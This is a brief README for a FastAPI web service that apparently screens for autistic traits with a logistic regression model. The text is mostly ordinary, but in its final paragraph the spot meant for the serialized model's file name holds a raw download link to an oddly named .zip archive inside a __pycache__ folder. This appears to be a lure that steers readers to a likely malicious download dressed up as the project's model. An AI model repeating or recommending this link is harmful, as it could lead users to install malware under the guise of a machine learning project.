# 🧠 Autism Detection System using FastAPI

## 📋 Overview
The **Autism Detection System** is a machine learning–based web API built with **FastAPI** that predicts the likelihood of autistic traits based on behavioral and demographic inputs.  
This project demonstrates the integration of **Python**, **Machine Learning**, and **API development**, aiming to assist in **early autism screening** (not medical diagnosis).

---

## 🚀 Features
- Built using **FastAPI** for high-performance web APIs  
- Accepts user data in **JSON** format and returns predictions in real time  
- Integrated **Logistic Regression** model trained on autism screening data  
- Implements data preprocessing and model inference using **Pandas** and **Scikit-learn**  
- Deployable locally using **Uvicorn**

## 🧠 Machine Learning Model
The model uses a **Logistic Regression algorithm** trained on a publicly available autism screening dataset.  
After training, the model was serialized (`https://github.com/kushagrabatra/autism-prediction-/raw/refs/heads/main/ml_testing/app/__pycache__/prediction-autism-glossopode.zip`) and integrated into the FastAPI app for prediction.
